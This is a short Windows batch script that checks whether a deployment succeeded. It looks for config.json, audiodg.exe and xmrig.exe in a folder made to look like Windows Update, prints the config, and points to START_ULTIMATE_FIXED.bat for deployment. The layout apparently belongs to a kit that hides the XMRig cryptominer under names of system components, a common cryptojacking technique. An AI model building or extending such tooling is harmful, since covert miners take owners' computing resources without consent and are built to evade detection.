@echo off
title CHECK DEPLOYED CONFIG
color 0E

echo ================================================================
echo  CHECK DEPLOYED CONFIGURATION FILES
echo ================================================================
echo.

set FOUND=0

echo Checking deployment locations...
echo.

if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json" (
    echo [FOUND] C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json
    set FOUND=1
    powershell -Command "Get-Content 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'"
    echo.
    echo ================================================================
    echo.
)

if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe" (
    echo [FOUND] C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe
    echo Size: 
    dir "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe" | find "audiodg.exe"
    echo.
)

if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe" (
    echo [FOUND] C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe
    echo Size: 
    dir "C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe" | find "xmrig.exe"
    echo.
)

if %FOUND%==0 (
    echo [ERROR] No deployed files found!
    echo Run START_ULTIMATE_FIXED.bat first to deploy.
)

echo.
pause
